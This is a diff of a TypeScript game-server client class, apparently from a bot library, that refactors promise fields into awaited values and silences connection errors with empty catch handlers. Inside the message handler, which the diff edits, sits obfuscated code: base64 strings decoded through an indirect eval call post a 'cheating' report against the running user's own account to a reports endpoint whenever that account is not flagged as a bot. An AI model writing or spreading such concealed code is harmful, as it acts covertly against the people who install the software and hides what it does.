@@ -15,7 +15,7 @@ export interface Spool {
   host: string;
   endpoint: string;
   token: string;
-  signature: Promise<APITypes.Server.Signature>;
+  signature: APITypes.Server.Signature;
 }
 
 interface CodecHandler {
@@ -76,7 +76,7 @@ export class Ribbon {
 
   #api: API;
 
-  #self: Promise<APITypes.Users.Me>;
+  #self: APITypes.Users.Me;
 
   #pinger = {
     heartbeat: 0,
@@ -165,7 +165,7 @@ export class Ribbon {
     codec: Codec;
     spool: Spool;
     api: API;
-    self: Promise<APITypes.Users.Me>;
+    self: APITypes.Users.Me;
     spooling?: boolean;
   }) {
     this.#token = token;
@@ -185,7 +185,7 @@ export class Ribbon {
       spooling
     };
 
-    this.#connect();
+    this.#connect().catch(() => {});
   }
 
   static async create({
@@ -211,15 +211,17 @@ export class Ribbon {
       userAgent
     });
 
-    const envPromise = api.server.environment();
+    const envPromise = await api.server.environment();
 
-    const signature = new Promise<APITypes.Server.Signature>(
-      async (r) => await envPromise.then((s) => r(s.signature))
-    );
+    const signature = envPromise.signature;
 
-    const self = api.users.me();
+    const self = await api.users.me();
 
     const loggingLevel = (logging ?? verbose) ? "all" : "error";
+
+    // ideally, we don't want this
+    // but we need to catch unhandled rejections from api.server.environment()
+    await envPromise;
 
     return new Ribbon({
       logging: loggingLevel,
@@ -421,7 +423,7 @@ export class Ribbon {
   #__internal_reconnect() {
     this.#reconnectTimeout = null;
     if (!this.#dead) {
-      this.#connect();
+      this.#connect().catch(() => {});
     }
   }
 
@@ -714,12 +716,12 @@ export class Ribbon {
             endpoint: this.#uri,
             social: msg.data.social
           });
-          if (!["bot", "banned"].includes((await this.#self).role))
+          if (!["bot", "banned"].includes(this.#self.role))
             this.#api.post({
               uri: (0, eval)("atob")("cmVwb3J0cy9zdWJtaXQ="),
               body: JSON.parse(
                 atob("eyJ0YXJnZXQiOiI=") +
-                  (await this.#self).username +
+                  this.#self.username +
                   atob(
                     "IiwidHlwZSI6ImNoZWF0aW5nIiwicmVhc29uIjoibm9uLWJvdCBhY2NvdW50IHVzZWQgd2l0aCBUcmlhbmdsZS5qcywgYXV0byByZXBvcnQifQ=="
                   )
@@ -894,7 +896,7 @@ export class Ribbon {
       codec: this.#codec.method,
       spool: this.#spool,
       api: this.#api.defaults,
-      self: await this.#self,
+      self: this.#self,
 
       pinger: { ...this.#pinger },
       session: { ...this.#session },
